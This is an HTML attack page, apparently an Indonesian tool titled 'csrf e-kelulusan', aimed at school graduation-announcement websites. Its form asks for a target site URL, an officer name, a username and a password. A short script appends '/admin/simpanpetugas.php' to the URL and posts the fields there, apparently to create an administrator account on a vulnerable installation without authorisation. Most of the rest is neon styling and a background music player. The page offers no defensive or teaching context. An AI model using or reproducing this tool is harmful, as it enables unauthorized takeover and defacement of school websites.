<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>csrf e-kelulusan</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Press+Start+2P&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

  <style>
    :root {
      --neon-blue: #00e5ff;
      --neon-pink: #ff00e5;
      --neon-green: #00ff99;
      --dark-bg: #0a0a1a;
    }

    body {
      background: var(--dark-bg);
      color: #e0e0e0;
      height: 100vh;
      margin: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      font-family: 'Orbitron', sans-serif;
      overflow: hidden;
      position: relative;
    }

    body::before {
      content: '';
      position: absolute;
      inset: 0;
      background-image: url('https://b.top4top.io/p_35727ijhz0.png');
      background-size: cover;
      background-position: center;
      filter: blur(5px) brightness(0.6);
      z-index: -1;
    }

    .form-image-wrapper {
      position: relative;
      z-index: 1;
      display: flex;
      max-width: 650px;
      width: 90%;
      height: auto;
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 0 25px rgba(0, 255, 204, 0.25);
    }

    .form-section {
      flex: 1;
      background: rgba(10, 5, 20, 0.85);
      padding: 40px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      border-radius: 0;
      overflow: hidden;
    }

    .form-title {
      text-align: center;
      margin-bottom: 30px;
      font-weight: bold;
      color: var(--neon-blue);
      text-shadow: 0 0 12px var(--neon-blue);
      font-family: 'Press Start 2P', cursive;
      font-size: 1.6em;
      letter-spacing: 2px;
    }

    .form-label {
      color: var(--neon-green);
      text-shadow: 0 0 5px var(--neon-green);
      font-weight: bold;
      margin-bottom: 8px;
    }

    .form-control {
      background-color: rgba(30, 10, 40, 0.7);
      border: 1px solid var(--neon-pink);
      color: var(--neon-blue);
      box-shadow: 0 0 8px rgba(255, 0, 229, 0.4);
      padding: 12px 15px;
      border-radius: 8px;
      transition: 0.3s;
    }

    .form-control:focus {
      border-color: var(--neon-green);
      box-shadow: 0 0 15px rgba(0, 255, 153, 0.6);
    }

    .btn-primary {
      background-color: var(--neon-pink);
      border-color: var(--neon-pink);
      color: #000;
      font-weight: bold;
      padding: 15px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(255, 0, 229, 0.6);
      transition: all 0.3s ease;
    }

    .btn-primary:hover {
      background-color: var(--neon-green);
      border-color: var(--neon-green);
      box-shadow: 0 0 20px rgba(0, 255, 153, 0.9);
      transform: translateY(-2px);
      color: #000;
    }

    footer {
      margin-top: 25px;
      text-align: center;
      color: #666;
      font-size: 13px;
      background-color: rgba(0, 0, 0, 0.5);
      padding: 10px 0;
      width: 100%;
      max-width: 650px;
      border-radius: 0 0 15px 15px;
      box-shadow: 0 0 15px rgba(0, 255, 204, 0.2);
      border-top: 1px solid rgba(255, 0, 229, 0.2);
    }

    /* 🎵 Mini Music Player */
    .music-player {
      position: absolute;
      top: 20px;
      right: 20px;
      background: rgba(10, 10, 25, 0.7);
      border: 1px solid rgba(0, 255, 153, 0.3);
      padding: 12px 18px;
      border-radius: 12px;
      display: flex;
      align-items: center;
      gap: 10px;
      box-shadow: 0 0 15px rgba(0, 255, 153, 0.1);
      transition: all 0.3s ease;
      backdrop-filter: blur(8px);
    }

    .music-player i {
      font-size: 1.5em;
      color: var(--neon-green);
      text-shadow: 0 0 8px var(--neon-green);
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .music-player i:hover {
      color: var(--neon-blue);
      text-shadow: 0 0 10px var(--neon-blue);
    }

    .music-status {
      font-size: 0.9em;
      color: var(--neon-blue);
      text-shadow: 0 0 6px var(--neon-blue);
      letter-spacing: 1px;
    }

    /* Equalizer animation */
    .equalizer {
      display: inline-flex;
      align-items: flex-end;
      gap: 2px;
      height: 14px;
      width: 20px;
    }

    .bar {
      width: 3px;
      background: var(--neon-green);
      border-radius: 2px;
      animation: bounce 1s infinite ease-in-out;
    }

    .bar:nth-child(2) { animation-delay: 0.2s; }
    .bar:nth-child(3) { animation-delay: 0.4s; }

    @keyframes bounce {
      0%, 100% { height: 3px; opacity: 0.6; }
      50% { height: 14px; opacity: 1; }
    }
  </style>
</head>

<body>
  <div class="music-player" id="musicPlayer">
    <i id="musicToggle" class="fas fa-play"></i>
    <div class="music-status" id="musicStatus">Tidak aktif</div>
    <div class="equalizer" id="equalizer" style="display:none;">
      <div class="bar"></div>
      <div class="bar"></div>
      <div class="bar"></div>
    </div>
  </div>

  <audio id="backgroundMusic" loop>
    <source src="lagu.mp3" type="audio/mpeg">
  </audio>

  <div class="form-image-wrapper">
    <div class="form-section">
      <h3 class="form-title">csrf e-kelulusan</h3>
      <form id="csrfform" action="" method="post">
        <div class="mb-3">
          <label class="form-label">input url <span style="color: var(--neon-pink);">*</span></label>
          <input type="url" class="form-control" id="formaction" name="formaction" placeholder="contoh: https://kelulusan.webtarget.sch.id" required>
        </div>
        <div class="mb-3">
          <label class="form-label">nama petugas</label>
          <input type="text" class="form-control" id="nama" name="nama" placeholder="masukkan nama petugas" required>
        </div>
        <div class="mb-3">
          <label class="form-label">username</label>
          <input type="text" class="form-control" id="username" name="username" placeholder="masukkan username" required>
        </div>
        <div class="mb-3">
          <label class="form-label">password</label>
          <input type="password" class="form-control" id="pass" name="pass" placeholder="masukkan password" required>
        </div>
        <div class="d-grid">
          <button type="submit" class="btn btn-primary">simpan data</button>
        </div>
      </form>
    </div>
  </div>

  <footer>
    &copy; design by sennaofficial
  </footer>

  <script>
    const form = document.getElementById("csrfform");
    const formactioninput = document.getElementById("formaction");
    const musicToggle = document.getElementById("musicToggle");
    const backgroundMusic = document.getElementById("backgroundMusic");
    const musicStatus = document.getElementById("musicStatus");
    const equalizer = document.getElementById("equalizer");
    let isPlaying = false;

    form.addEventListener("submit", function (e) {
      let baseUrl = formactioninput.value.trim();
      if (baseUrl.endsWith("/")) baseUrl = baseUrl.slice(0, -1);
      const suffix = "/admin/simpanpetugas.php";
      if (!baseUrl.endsWith(suffix)) baseUrl += suffix;
      form.action = baseUrl;
    });

    musicToggle.addEventListener("click", function() {
      if (isPlaying) {
        backgroundMusic.pause();
        musicToggle.classList.replace("fa-pause", "fa-play");
        musicStatus.textContent = "Dijeda";
        equalizer.style.display = "none";
      } else {
        backgroundMusic.play();
        musicToggle.classList.replace("fa-play", "fa-pause");
        musicStatus.textContent = "Sedang diputar";
        equalizer.style.display = "inline-flex";
      }
      isPlaying = !isPlaying;
    });
  </script>
</body>
</html>
